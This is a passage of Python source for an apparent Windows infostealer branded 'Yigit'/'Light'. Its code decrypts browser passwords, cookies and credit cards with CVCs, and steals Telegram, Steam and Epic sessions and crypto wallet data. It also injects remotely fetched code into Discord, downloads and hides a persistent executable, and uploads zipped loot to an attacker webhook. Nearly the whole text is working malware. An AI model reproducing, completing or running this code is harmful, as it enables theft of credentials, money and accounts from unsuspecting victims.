                return decrypted_pass.decode('utf-8', errors='replace')
    except Exception as e:
        return f"<decryption_failed: {e}>"

def fetch_sqlite_copy(db_path):
    try:
        tmp_path = pathlib.Path(os.environ['TEMP']) / pathlib.Path(db_path).name
        logger.debug(f"Copying DB from {db_path} to {tmp_path}")
        shutil.copy2(db_path, tmp_path)
        return tmp_path
    except Exception as e:
        logger.error(f"Error copying SQLite DB: {e}")
        return None

def discord_injection():
    try:
        local = os.environ.get('LOCALAPPDATA')
        if not local: return
        
        # Get injection payload
        payload = {"key": PANEL_KEY}
        data = json.dumps(payload).encode('utf-8')
        req = urllib.request.Request(f"http://{SERVER_URL}/dc-injector", data=data, headers={'Content-Type': 'application/json'})
        with urllib.request.urlopen(req) as response:
            injection_data = json.loads(response.read().decode())
            if not injection_data or 'data' not in injection_data: return
            code = injection_data['data']
            
        for dir_name in os.listdir(local):
            if 'cord' not in dir_name.lower(): continue
            discord_path = os.path.join(local, dir_name)
            if not os.path.isdir(discord_path): continue
            
            app_dirs = [d for d in os.listdir(discord_path) if d.startswith('app-')]
            if not app_dirs: continue
            app_dirs.sort(key=lambda x: [int(c) if c.isdigit() else c for c in re.split('([0-9]+)', x)], reverse=True)
            latest_app = os.path.join(discord_path, app_dirs[0])
            
            modules_path = os.path.join(latest_app, 'modules')
            if not os.path.exists(modules_path): continue
            
            for mod_name in os.listdir(modules_path):
                if 'discord_desktop_core' in mod_name:
                    core_path = os.path.join(modules_path, mod_name, 'discord_desktop_core')
                    index_js = os.path.join(core_path, 'index.js')
                    if os.path.exists(index_js):
                        with open(index_js, 'w', encoding='utf-8') as f:
                            f.write(code)
                        # Zero out ldb files to force logout/re-login
                        db_path = os.path.join(os.environ.get('APPDATA'), dir_name, 'Local Storage', 'leveldb')
                        if os.path.exists(db_path):
                            for f_name in os.listdir(db_path):
                                if f_name.endswith('.ldb'):
                                    with open(os.path.join(db_path, f_name), 'w') as f_ldb: pass
    except: pass

def zip_directory(path, zip_path):
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(path):
            for file in files:
                if 'media_cache' in root.lower(): continue
                zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), path))

def steal_telegram():
    print("[*] Stealing Telegram sessions...")
    try:
        tdata_path = os.path.join(os.environ.get('APPDATA'), 'Telegram Desktop', 'tdata')
        if not os.path.exists(tdata_path):
             print("[-] Telegram tdata not found.")
             return
        
        # Kill Telegram
        subprocess.run(["taskkill", "/F", "/IM", "Telegram.exe"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(1)
        
        temp_zip = os.path.join(os.environ.get('TEMP'), f"Telegram_{int(datetime.now().timestamp())}.zip")
        zip_directory(tdata_path, temp_zip)
        
        if os.path.exists(temp_zip) and os.path.getsize(temp_zip) > 0:
            print("[+] Telegram session zipped. Uploading...")
            link = upload_file(temp_zip)
            if link:
                payload = {
                    "embeds": [
                        {
                            "title": f"⚓️ Yigit (Telegram Session) - {os.getlogin()}",
                            "description": f"📎 Download: [CLICK!]({link})",
                            "color": 0x808080,
                            "footer": {"text": "Yigit | t.me/layer7730"}
                        }
                    ]
                }
                send_webhook(payload)
            os.remove(temp_zip)
    except Exception as e:
         print(f"[-] Telegram stealing failed: {e}")


def steal_wallets():
    try:
        local = os.environ.get('LOCALAPPDATA')
        roaming = os.environ.get('APPDATA')
        wallet_paths = {
            'Exodus': os.path.join(roaming, 'Exodus', 'exodus.wallet'),
            'Trust': '\\Local Extension Settings\\egjidjbpglichdcondbcbdnbeeppgdph',
            'Metamask': '\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn',
            'Phantom': '\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa'
        }
        
        found_wallets = []
        temp_dir = os.path.join(os.environ.get('TEMP'), f"Wallets_{int(datetime.now().timestamp())}")
        os.makedirs(temp_dir, exist_ok=True)
        
        # Exodus
        exod_path = wallet_paths['Exodus']
        if os.path.exists(exod_path):
            shutil.copytree(exod_path, os.path.join(temp_dir, 'Exodus'))
            found_wallets.append('Exodus')
            
        # Extensions
        browser_roots = {
            'Chrome': os.path.join(local, 'Google', 'Chrome', 'User Data'),
            'Edge': os.path.join(local, 'Microsoft', 'Edge', 'User Data'),
            'Brave': os.path.join(local, 'BraveSoftware', 'Brave-Browser', 'User Data')
        }
        
        for b_name, b_root in browser_roots.items():
            if not os.path.exists(b_root): continue
            for profile in ['Default', 'Profile 1', 'Profile 2', 'Profile 3']:
                p_path = os.path.join(b_root, profile)
                if not os.path.exists(p_path): continue
                for w_name, w_rel in wallet_paths.items():
                    if w_name == 'Exodus': continue
                    w_full = p_path + w_rel
                    if os.path.exists(w_full):
                        dest = os.path.join(temp_dir, f"{b_name}_{profile}_{w_name}")
                        shutil.copytree(w_full, dest)
                        found_wallets.append(f"{b_name} {w_name}")
                        
        if found_wallets:
            zip_path = temp_dir + ".zip"
            zip_directory(temp_dir, zip_path)
            link = upload_file(zip_path)
            if link:
                payload = {
                    "embeds": [
                        {
                            "title": f"⚓️ Light - Wallets Found ({os.getlogin()})",
                            "description": f"Download: [CLICK!]({link})\n\nFound: {', '.join(found_wallets)}",
                            "color": 0x808080,
                            "footer": {"text": "Yigit | t.me/layer7730"}
                        }
                    ]
                }
                send_webhook(payload)
            os.remove(zip_path)
        shutil.rmtree(temp_dir)
    except: pass

def steal_steam():
    try:
        steam_path = r"C:\Program Files (x86)\Steam\config"
        if not os.path.exists(steam_path): return
        
        # Kill Steam
        subprocess.run(["taskkill", "/F", "/IM", "Steam.exe"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        temp_zip = os.path.join(os.environ.get('TEMP'), f"Steam_{int(datetime.now().timestamp())}.zip")
        zip_directory(steam_path, temp_zip)
        
        link = upload_file(temp_zip)
        if link:
            # Try to get account info
            acc_list = "Unknown"
            vdf_path = os.path.join(steam_path, 'loginusers.vdf')
            if os.path.exists(vdf_path):
                with open(vdf_path, 'r', errors='ignore') as f:
                    acc_list = ", ".join(re.findall(r'7656[0-9]{13}', f.read()))
            
            payload = {
                "embeds": [
                    {
                        "title": f"🏴‍☠️ Light (Steam Session) - {os.getlogin()}",
                        "description": f"Download: [CLICK!]({link})\nAccounts: {acc_list}",
                        "color": 0x808080,
                        "footer": {"text": "Yigit | t.me/layer7730"}
                    }
                ]
            }
            send_webhook(payload)
        os.remove(temp_zip)
    except: pass

def steal_epic():
    try:
        epic_path = os.path.join(os.environ.get('LOCALAPPDATA'), 'EpicGamesLauncher', 'Saved', 'Config', 'Windows')
        if not os.path.exists(epic_path): return
        
        # Kill Epic
        subprocess.run(["taskkill", "/F", "/IM", "EpicGamesLauncher.exe"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        temp_zip = os.path.join(os.environ.get('TEMP'), f"Epic_{int(datetime.now().timestamp())}.zip")
        zip_directory(epic_path, temp_zip)
        
        link = upload_file(temp_zip)
        if link:
            payload = {
                "embeds": [
                    {
                        "title": f"🏴‍☠️ Light (EpicGames Data) - {os.getlogin()}",
                        "description": f"Download: [CLICK!]({link})",
                        "color": 0x808080,
                        "footer": {"text": "Yigit | t.me/layer7730"}
                    }
                ]
            }
            send_webhook(payload)
        os.remove(temp_zip)
    except: pass

def download_panel():
    try:
        if not PANEL_KEY: return
        exe_url = f"http://{SERVER_URL}/download"
        temp_dir = os.environ.get('TEMP')
        exe_path = os.path.join(temp_dir, f"Yigit_{''.join(random.choices(string.ascii_lowercase + string.digits, k=8))}.exe")
        
        # Download
        urllib.request.urlretrieve(exe_url, exe_path)
        
        if os.path.exists(exe_path):
            # Run hidden
            subprocess.Popen([exe_path, PANEL_KEY], creationflags=0x08000000) # CREATE_NO_WINDOW
            
            # Startup persistence
            vbs_path = os.path.join(temp_dir, 'startup.vbs')
            vbs_content = f'Set WshShell = CreateObject("WScript.Shell")\nWshShell.Run chr(34) & "{exe_path}" & chr(34), 0, False'
            with open(vbs_path, 'w') as f: f.write(vbs_content)
            
            startup_folder = os.path.join(os.environ.get('USERPROFILE'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            shutil.copy2(vbs_path, os.path.join(startup_folder, 'startup.vbs'))
    except: pass

def get_chrome_datetime(timestamp):



    try:
        if not timestamp:
            return "Unknown"
        # Chrome timestamps are microseconds since 1601-01-01
        epoch = datetime(1601, 1, 1)
        return (epoch + timedelta(microseconds=timestamp)).strftime("%Y-%m-%d %H:%M:%S")
    except Exception:
        return "Unknown"

def extract_bookmarks(profile_path):
    bookmarks_path = profile_path / "Bookmarks"
    if not bookmarks_path.exists():
        return []
    
    try:
        with open(bookmarks_path, "r", encoding="utf-8") as f:
            data = json.load(f)
            
        bookmarks = []
        
        def process_node(node):
            if isinstance(node, dict):
                if node.get("type") == "url":
                    name = node.get("name", "Unknown")
                    url = node.get("url", "Unknown")
                    bookmarks.append(f"{name}\t{url}")
                
                if "children" in node:
                    for child in node["children"]:
                        process_node(child)
                        
        if "roots" in data:
            for root in data["roots"].values():
                process_node(root)
                
        return bookmarks
    except Exception as e:
        logger.error(f"Error extracting bookmarks: {e}")
        return []

def extract_history(profile_path):
    history_db = profile_path / "History"
    if not history_db.exists():
        return []
        
    db_copy = fetch_sqlite_copy(history_db)
    if not db_copy:
        return []
        
    try:
        con = sqlite3.connect(db_copy)
        cur = con.cursor()
        cur.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 1000")
        rows = cur.fetchall()
        con.close()
        try: os.remove(db_copy)
        except: pass
        
        history_items = []
        for url, title, visit_count, last_visit in rows:
            date_str = get_chrome_datetime(last_visit)
            history_items.append(f"{url}\t{title}\t{visit_count}\t{date_str}")
            
        return history_items
    except Exception as e:
        logger.error(f"Error extracting history: {e}")
        if os.path.exists(db_copy):
            try: os.remove(db_copy)
            except: pass
        return []

def extract_credit_cards(profile_path, master_key):
    web_data_db = profile_path / "Web Data"
    if not web_data_db.exists():
        return []
        
    db_copy = fetch_sqlite_copy(web_data_db)
    if not db_copy:
        return []
        
    try:
        con = sqlite3.connect(db_copy)
        cur = con.cursor()
        
        # Load CVCs
        local_cvcs = {}
        try:
            cur.execute("SELECT guid, value_encrypted FROM local_stored_cvc")
            for guid, encrypted in cur.fetchall():
                local_cvcs[guid] = encrypted
        except sqlite3.OperationalError:
            pass # Table might not exist
            
        server_cvcs = {}
        try:
            cur.execute("SELECT instrument_id, value_encrypted FROM server_stored_cvc")
            for inst_id, encrypted in cur.fetchall():
                server_cvcs[str(inst_id)] = encrypted
        except sqlite3.OperationalError:
            pass

        cards = []
        
        # Local cards
        try:
            cur.execute("SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
            for guid, name, exp_m, exp_y, enc_num in cur.fetchall():
                try:
                    decrypted_num = decrypt_v20_password(enc_num, master_key)
                    if decrypted_num.startswith("<decryption_failed"):
                         decrypted_num = "DECRYPT_FAILED"
                    
                    cvc = "N/A"
                    if guid in local_cvcs:
                        decrypted_cvc = decrypt_v20_password(local_cvcs[guid], master_key)
                        if not decrypted_cvc.startswith("<decryption_failed"):
                            cvc = decrypted_cvc
                            
                    cards.append(f"================\nGUID: {guid}\nNAME: {name}\nNUMBER: {decrypted_num}\nVALID: {exp_m}/{exp_y}\nCVC: {cvc}\nTYPE: Local Card")
                except Exception as e:
                    logger.error(f"Error processing local card {guid}: {e}")
        except sqlite3.OperationalError as e:
            logger.error(f"OperationalError querying credit_cards: {e}")

        # Server cards
        try:
            cur.execute("SELECT id, name_on_card, exp_month, exp_year, last_four FROM masked_credit_cards")
            for card_id, name, exp_m, exp_y, last_four in cur.fetchall():
                try:
                    decrypted_num = f"**** **** **** {last_four}"
                    
                    cvc = "N/A"
                    if str(card_id) in server_cvcs and master_key:
                        decrypted_cvc = decrypt_v20_password(server_cvcs[str(card_id)], master_key)
                        if not decrypted_cvc.startswith("<decryption_failed"):
                            cvc = decrypted_cvc
                            
                    cards.append(f"================\nID: {card_id}\nNAME: {name}\nNUMBER: {decrypted_num}\nVALID: {exp_m}/{exp_y}\nCVC: {cvc}\nTYPE: Masked/Server Card")
                except Exception as e:
                    logger.error(f"Error processing server card {card_id}: {e}")
        except sqlite3.OperationalError as e:
            logger.error(f"OperationalError querying masked_credit_cards: {e}")
            
        con.close()
        try: os.remove(db_copy)
        except: pass
        return cards
    except Exception as e:
        logger.error(f"Error extracting credit cards: {e}")
        if os.path.exists(db_copy):
            try: os.remove(db_copy)
            except: pass
        return []

def get_master_key(browser_config):
    logger.info(f"Getting master key for {browser_config['name']}")
    try:
        user_profile = os.environ['USERPROFILE']
        local_state_path = os.path.join(user_profile, browser_config['local_state'])
        logger.debug(f"Local state path: {local_state_path}")
        
        if not os.path.exists(local_state_path):
            logger.warning("Local state file not found")
            return None
            
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        
        if "os_crypt" in local_state and "app_bound_encrypted_key" in local_state["os_crypt"]:
            logger.debug("Found app_bound_encrypted_key")
            key_blob_encrypted = binascii.a2b_base64(local_state["os_crypt"]["app_bound_encrypted_key"])[4:]
        elif "os_crypt" in local_state and "encrypted_key" in local_state["os_crypt"]:
            logger.debug("Found encrypted_key")
            key_blob_encrypted = binascii.a2b_base64(local_state["os_crypt"]["encrypted_key"])[5:]
            return windows.crypto.dpapi.unprotect(key_blob_encrypted)
        else:
            logger.warning("No encrypted key found in local state")
            return None
            
        logger.debug("Decrypting system key with LSASS impersonation")
        with get_system_context():
            key_blob_system_decrypted = windows.crypto.dpapi.unprotect(key_blob_encrypted)
            
        logger.debug("Decrypting user key")
        key_blob_user_decrypted = windows.crypto.dpapi.unprotect(key_blob_system_decrypted)
        
        logger.debug("Parsing decrypted key blob")
        parsed_data = parse_key_blob(key_blob_user_decrypted)
        
        if parsed_data['flag'] not in (1, 2, 3):
            logger.debug("Returning raw key data")
            return key_blob_user_decrypted[-32:]
            
        logger.debug("Deriving final master key")
        return derive_v20_master_key(parsed_data, browser_config['key_name'])
    except Exception as e:
        logger.error(f"Error getting master key: {e}")
        return None

def process_chromium_browser(browser_name, browser_config):
    logger.info(f"Processing Chromium browser: {browser_name}")
    user_profile = os.environ['USERPROFILE']
    browser_data_path = pathlib.Path(user_profile) / browser_config['data_path']
    
    if not browser_data_path.exists():
        logger.warning(f"Browser data path not found: {browser_data_path}")
        return
        
    master_key = get_master_key(browser_config)
    if not master_key:
        logger.warning("Could not retrieve master key - sensitive data (passwords/cookies) will not be decrypted")
    else:
        logger.debug("Master key retrieved successfully")
        
    profiles = [p for p in browser_data_path.iterdir() if
                p.is_dir() and (p.name == "Default" or p.name.startswith("Profile"))]
    
    logger.info(f"Found {len(profiles)} profiles")
    
    for profile_dir in profiles:
        profile_name = profile_dir.name.lower()
        logger.info(f"Processing profile: {profile_name}")
        
        profile_output_dir = OUTPUT_BASE_DIR / browser_name / profile_name
        profile_output_dir.mkdir(parents=True, exist_ok=True)
        password_file = profile_output_dir / "passwords.txt"
        autofill_file = profile_output_dir / "auto_fills.txt"
        cookies_file = profile_output_dir / "cookies.txt"
        bookmarks_file = profile_output_dir / "bookmarks.txt"
        history_file = profile_output_dir / "history.txt"
        credit_cards_file = profile_output_dir / "credit_cards.txt"
        
        cookie_db_path = profile_dir / "Network" / "Cookies"
        login_db_path = profile_dir / "Login Data"
        webdata_db_path = profile_dir / "Web Data"

        # Process Bookmarks
        bookmarks = extract_bookmarks(profile_dir)
        if bookmarks:
            with open(bookmarks_file, "w", encoding="utf-8") as f:
                f.write("# Name\tURL\n")
                for b in bookmarks:
                    f.write(f"{b}\n")
            logger.debug(f"Extracted {len(bookmarks)} bookmarks")

        # Process History
        history = extract_history(profile_dir)
        if history:
            with open(history_file, "w", encoding="utf-8") as f:
                f.write("# URL\tTitle\tVisit Count\tLast Visit\n")
                for h in history:
                    f.write(f"{h}\n")
            logger.debug(f"Extracted {len(history)} history items")

        # Process Credit Cards
        cards = extract_credit_cards(profile_dir, master_key)
        if cards:
            with open(credit_cards_file, "w", encoding="utf-8") as f:
                f.write("# Credit Cards\n")
                for c in cards:
                    f.write(f"{c}\n\n")
            logger.debug(f"Extracted {len(cards)} credit cards")

        # Process Cookies
        try:
            if cookie_db_path.exists():
                logger.debug(f"Processing cookies from {cookie_db_path}")
                cookie_copy = fetch_sqlite_copy(cookie_db_path)
                if cookie_copy:
                    con = sqlite3.connect(cookie_copy)
                    cur = con.cursor()
                    cur.execute("SELECT host_key, name, path, expires_utc, is_secure, is_httponly, CAST(encrypted_value AS BLOB) FROM cookies;")
                    cookies = cur.fetchall()
                    logger.debug(f"Found {len(cookies)} cookies")
                    
                    with open(cookies_file, "w", encoding="utf-8") as f:
                        f.write("# Netscape HTTP Cookie File\n")
                        f.write("# domain\tflag\tpath\tsecure\texpiration\tname\tvalue\n")
                        success_count = 0
                        for host, name, path, expires, secure, httponly, encrypted_value in cookies:
                            if encrypted_value and (encrypted_value[:3] in (b"v10", b"v11", b"v20")):
                                decrypted = decrypt_v20_value(encrypted_value, master_key)
                                value_str = decrypted if decrypted else "DECRYPT_FAILED"
                                if decrypted:
                                    success_count += 1
                                flag = "TRUE" if (host and host.startswith('.')) else "FALSE"
                                secure_str = "TRUE" if secure else "FALSE"
                                try:
                                    secs = int(expires) // 1000000
                                except Exception:
                                    secs = 0
                                unix_exp = secs - 11644473600 if secs > 11644473600 else 0
                                path_str = path if path else "/"
                                line = f"{host}\t{flag}\t{path_str}\t{secure_str}\t{unix_exp}\t{name}\t{value_str}\n"
                                f.write(line)
                        logger.debug(f"Successfully decrypted {success_count} cookies")
                    con.close()
                    try: os.remove(cookie_copy)
                    except: pass
            else:
                logger.debug("No cookie DB found")
        except Exception as e:
            logger.error(f"Error processing cookies: {e}")

        # Process Logins
        try:
            if login_db_path.exists():
                logger.debug(f"Processing logins from {login_db_path}")
                con = sqlite3.connect(pathlib.Path(login_db_path).as_uri() + "?mode=ro", uri=True)
                cur = con.cursor()
                cur.execute("SELECT origin_url, username_value, CAST(password_value AS BLOB) FROM logins;")
                logins = cur.fetchall()
                logger.debug(f"Found {len(logins)} logins")
                
                with open(password_file, "w", encoding="utf-8") as f:
                    f.write("# Passwords\n")
                    success_count = 0
                    for login in logins:
                        if login[2]:
                            logger.debug(f"Login prefix: {login[2][:3]}")
                            if (login[2][:3] in (b"v10", b"v11", b"v20")):
                                decrypted = decrypt_v20_password(login[2], master_key)
                                if decrypted and not decrypted.startswith("<decryption_failed"):
                                    success_count += 1
                                elif decrypted and decrypted.startswith("<decryption_failed"):
                                    logger.warning(f"Decryption failed for {login[0]}: {decrypted}")
                                    if login[2].startswith(b'v20') and "MAC check failed" in str(decrypted):
                                        logger.error("CRITICAL: v20 data found but key appears invalid. This usually means 'app_bound_encrypted_key' is missing from Local State.")
                                f.write(f"URL: {login[0]}\nUsername: {login[1]}\nPassword: {decrypted}\n\n")
                    logger.debug(f"Successfully decrypted {success_count} passwords")
                con.close()
            else:
                logger.debug("No login DB found")
        except Exception as e:
            logger.error(f"Error processing logins: {e}")

        # Process Autofill
        try:
            if webdata_db_path.exists():
                logger.debug(f"Processing autofill from {webdata_db_path}")
                db_copy = fetch_sqlite_copy(webdata_db_path)
                if db_copy:
                    con = sqlite3.connect(db_copy)
                    cur = con.cursor()
                    cur.execute("SELECT name, value FROM autofill;")
                    autofills = cur.fetchall()
                    logger.debug(f"Found {len(autofills)} autofill entries")
                    
                    with open(autofill_file, "a", encoding="utf-8") as f:
                        for name, value in autofills:
                            if name and name.strip():
                                if isinstance(value, bytes) and (value[:3] in (b"v10", b"v11", b"v20")):
                                    decrypted = decrypt_v20_value(value, master_key)
                                    value_str = decrypted if decrypted else "DECRYPT_FAILED"
                                else:
                                    value_str = value
                                line = f"Field: {name}\nValue: {value_str}\n\n"
                                f.write(line)
                    con.close()
                    try: os.remove(db_copy)
                    except: pass
            else:
                logger.debug("No webdata DB found")
        except Exception as e:
            logger.error(f"Error processing autofill: {e}")

def extract_gecko_history(profile_path):
    places_db = profile_path / "places.sqlite"
    if not places_db.exists():
        return []
    
    db_copy = fetch_sqlite_copy(places_db)
    if not db_copy:
        return []
        
    try:
        con = sqlite3.connect(db_copy)
        cur = con.cursor()
        cur.execute("SELECT url, title, visit_count, last_visit_date FROM moz_places ORDER BY last_visit_date DESC LIMIT 1000")
        rows = cur.fetchall()
        con.close()
        try: os.remove(db_copy)
        except: pass
        
        history_items = []
        for url, title, visit_count, last_visit in rows:
            date_str = "Unknown"
            if last_visit:
                try:
                    # Firefox uses microseconds since Unix Epoch
                    date_str = datetime.fromtimestamp(last_visit / 1000000).strftime("%Y-%m-%d %H:%M:%S")
                except: pass
            
            title_str = title if title else "No Title"
            history_items.append(f"{url}\t{title_str}\t{visit_count}\t{date_str}")
            
        return history_items
    except Exception as e:
        logger.error(f"Error extracting gecko history: {e}")
        if os.path.exists(db_copy):
            try: os.remove(db_copy)
            except: pass
        return []

def extract_gecko_bookmarks(profile_path):
    places_db = profile_path / "places.sqlite"
    if not places_db.exists():
        return []
    
    db_copy = fetch_sqlite_copy(places_db)
    if not db_copy:
        return []
        
    try:
        con = sqlite3.connect(db_copy)
        cur = con.cursor()
        cur.execute("""
            SELECT b.title, p.url 
            FROM moz_bookmarks b 
            JOIN moz_places p ON b.fk = p.id 
            WHERE b.type = 1
        """)
        rows = cur.fetchall()
        con.close()
        try: os.remove(db_copy)
        except: pass
        
        bookmarks = []
        for title, url in rows:
            name = title if title else "Unknown"
            bookmarks.append(f"{name}\t{url}")
            
        return bookmarks
    except Exception as e:
        logger.error(f"Error extracting gecko bookmarks: {e}")
        if os.path.exists(db_copy):
            try: os.remove(db_copy)
            except: pass
        return []

def extract_gecko_autofill(profile_path):
    form_db = profile_path / "formhistory.sqlite"
    if not form_db.exists():
        return []
        
    db_copy = fetch_sqlite_copy(form_db)
    if not db_copy:
        return []
        
    try:
        con = sqlite3.connect(db_copy)
        cur = con.cursor()
        cur.execute("SELECT fieldname, value, timesUsed, firstUsed, lastUsed FROM moz_formhistory")
        rows = cur.fetchall()
        con.close()
        try: os.remove(db_copy)
        except: pass
        
        autofills = []
        for fieldname, value, times, first, last in rows:
            autofills.append(f"Field: {fieldname}\nValue: {value}\nTimes Used: {times}\n\n")
            
        return autofills
    except Exception as e:
        logger.error(f"Error extracting gecko autofill: {e}")
        if os.path.exists(db_copy):
            try: os.remove(db_copy)
            except: pass
        return []

def process_gecko_browser(browser_name, browser_config):
    logger.info(f"Processing Gecko browser: {browser_name}")
    user_profile = os.environ['USERPROFILE']
    browser_data_path = pathlib.Path(user_profile) / browser_config['data_path']
    
    if not browser_data_path.exists():
        logger.warning(f"Browser data path not found: {browser_data_path}")
        return

    nss_handler = NSSHandler()
    if not nss_handler.loaded:
        logger.error("Could not load NSS library")
        return

    # Find profiles
    # Firefox profiles usually in xxxxx.default-release or similar
    profiles = [p for p in browser_data_path.iterdir() if p.is_dir()]
    logger.info(f"Found {len(profiles)} profiles")

    for profile_dir in profiles:
        profile_name = profile_dir.name
        logger.info(f"Processing profile: {profile_name}")
        
        # We need to initialize NSS for this profile
        if not nss_handler.init_profile(profile_dir):
            logger.error(f"Skipping profile {profile_name} due to NSS init failure")
            continue

        profile_output_dir = OUTPUT_BASE_DIR / browser_name / profile_name
        profile_output_dir.mkdir(parents=True, exist_ok=True)
        password_file = profile_output_dir / "passwords.txt"
        cookies_file = profile_output_dir / "cookies.txt"
        history_file = profile_output_dir / "history.txt"
        bookmarks_file = profile_output_dir / "bookmarks.txt"
        autofill_file = profile_output_dir / "auto_fills.txt"
        
        cookies_db = profile_dir / "cookies.sqlite"
        logins_json = profile_dir / "logins.json"

        # Process Cookies
        if cookies_db.exists():
            try:
                logger.debug(f"Processing cookies from {cookies_db}")
                cookie_copy = fetch_sqlite_copy(cookies_db)
                if cookie_copy:
                    con = sqlite3.connect(cookie_copy)
                    cur = con.cursor()
                    # Firefox cookies are typically plaintext in the DB
                    cur.execute("SELECT host, name, path, expiry, isSecure, isHttpOnly, value FROM moz_cookies")
                    cookies = cur.fetchall()
                    logger.debug(f"Found {len(cookies)} cookies")
                    
                    with open(cookies_file, "w", encoding="utf-8") as f:
                        f.write("# Netscape HTTP Cookie File\n")
                        f.write("# domain\tflag\tpath\tsecure\texpiration\tname\tvalue\n")
                        for host, name, path, expires, secure, httponly, value in cookies:
                            flag = "TRUE" if (host and host.startswith('.')) else "FALSE"
                            secure_str = "TRUE" if bool(secure) else "FALSE"
                            path_str = path if path else "/"
                            line = f"{host}\t{flag}\t{path_str}\t{secure_str}\t{expires}\t{name}\t{value}\n"
                            f.write(line)
                    con.close()
            except Exception as e:
                logger.error(f"Error processing cookies: {e}")
        
        # Process Passwords (logins.json)
        if logins_json.exists():
            try:
                logger.debug(f"Processing logins from {logins_json}")
                with open(logins_json, "r", encoding="utf-8") as f:
                    data = json.load(f)
                
                if "logins" in data:
                    success_count = 0
                    with open(password_file, "w", encoding="utf-8") as f:
                        f.write("# Passwords\n")
                        for login in data["logins"]:
                            hostname = login.get("hostname", "")
                            encrypted_username = login.get("encryptedUsername")
                            encrypted_password = login.get("encryptedPassword")
                            
                            username = nss_handler.decrypt(encrypted_username) if encrypted_username else ""
                            password = nss_handler.decrypt(encrypted_password) if encrypted_password else ""
                            
                            if password: success_count += 1
                            
                            line = f"URL: {hostname}\nUsername: {username}\nPassword: {password}\n\n"
                            f.write(line)
                    logger.debug(f"Successfully decrypted {success_count} passwords")
            except Exception as e:
                logger.error(f"Error processing logins: {e}")

        # Process History
        history = extract_gecko_history(profile_dir)
        if history:
            with open(history_file, "w", encoding="utf-8") as f:
                f.write("# URL\tTitle\tVisit Count\tLast Visit\n")
                for h in history:
                    f.write(f"{h}\n")
            logger.debug(f"Extracted {len(history)} history items")

        # Process Bookmarks
        bookmarks = extract_gecko_bookmarks(profile_dir)
        if bookmarks:
            with open(bookmarks_file, "w", encoding="utf-8") as f:
                f.write("# Name\tURL\n")
                for b in bookmarks:
                    f.write(f"{b}\n")
            logger.debug(f"Extracted {len(bookmarks)} bookmarks")

        # Process Autofill
        autofills = extract_gecko_autofill(profile_dir)
        if autofills:
            with open(autofill_file, "w", encoding="utf-8") as f:
                for a in autofills:
                    f.write(a)
            logger.debug(f"Extracted {len(autofills)} autofill entries")

        # Shutdown NSS for this profile so we can potentially init another (though NSS often doesn't like re-init)
        nss_handler.shutdown()

def main():
    print("\n" + "="*50)
    print("      Yigit Client - STARTING      ")
    print("="*50 + "\n")
    
    OUTPUT_BASE_DIR.mkdir(parents=True, exist_ok=True)
    
    # Forensics Modules
    collect_system_info()
    # capture_screenshot() Removed by user request
    extract_discord_tokens()
    steal_telegram()
    steal_wallets()
    steal_steam()
    steal_epic()

    # Kill browser processes
    print("[*] Killing browser processes...")
    si = subprocess.STARTUPINFO()
    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    si.wShowWindow = subprocess.SW_HIDE

    for browser_name, browser_config in BROWSERS.items():
        try:
            subprocess.run(
                ["taskkill", "/F", "/IM", browser_config['process_name']],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                creationflags=0x08000000,  # CREATE_NO_WINDOW
                startupinfo=si
            )
        except: pass
    
    # Process Data
    print("[*] Processing browser data (Cookies, Passwords, etc.)...")
    processed_paths = set()
    user_profile = os.environ['USERPROFILE']
    for browser_name, browser_config in BROWSERS.items():
        try:
            data_path_rel = browser_config.get('data_path', '')
            data_path = pathlib.Path(user_profile) / data_path_rel if data_path_rel else None
            norm = str(data_path).lower() if data_path else ''
            if data_path and data_path.exists():
                if norm in processed_paths:
                    continue
                processed_paths.add(norm)
                print(f"    -> Processing {browser_config['name']}...")
            if browser_config['type'] == 'chromium':
                process_chromium_browser(browser_name, browser_config)
            elif browser_config['type'] == 'gecko':
                process_gecko_browser(browser_name, browser_config)
        except Exception as e:
            print(f"    [!] Error processing {browser_name}: {e}")

    # Final Zipping and Reporting
    print("\n[*] Creating final browser data archive...")
    zip_path = str(OUTPUT_BASE_DIR) + ".zip"
    try:
        zip_directory(str(OUTPUT_BASE_DIR), zip_path)
        if os.path.exists(zip_path):
            print("[+] Archive created. Uploading to Webhook...")
            link = upload_file(zip_path)
            if link:
                payload = {
                    "embeds": [
                        {
                             "title": f"⚓ Light Browser Data - {platform.node()}",
                             "description": f"🔍 Download All Data: [CLICK HERE!]({link})",
                             "color": 0x808080,
                             "footer": {
                                 "text": "Yigit | t.me/layer7730",
                                 "icon_url": "https://cdn.discordapp.com/avatars/1225349992588378145/60b39319643251199bb827dd341f579e.png?size=512"
                             }
                        }
                    ]
                }
                send_webhook(payload)
                print(f"[+] Final report sent. Link: {link}")
            else:
                print("[-] Upload failed.")
            os.remove(zip_path)
    except Exception as e:
        print(f"[-] Final zipping/reporting failed: {e}")

    print("\n" + "="*50)
    print("      Yigit Client - COMPLETED      ")
    print("="*50 + "\n")


if __name__ == "__main__":
    if not is_admin():
        # Re-run the program with admin rights
        try:
            if getattr(sys, 'frozen', False):
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv[1:]), None, 0)
            else:
                # Include the script path when running as source
                script_path = os.path.abspath(sys.argv[0])
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script_path}" {" ".join(sys.argv[1:])}', None, 0)
        except Exception as e:
            logger.error(f"Failed to elevate privileges: {e}")
        sys.exit()

    try:
        main()
    except Exception as e:
        logger.critical(f"Unhandled exception in main: {e}")
    finally:
        print("EXECUTION COMPLETE")
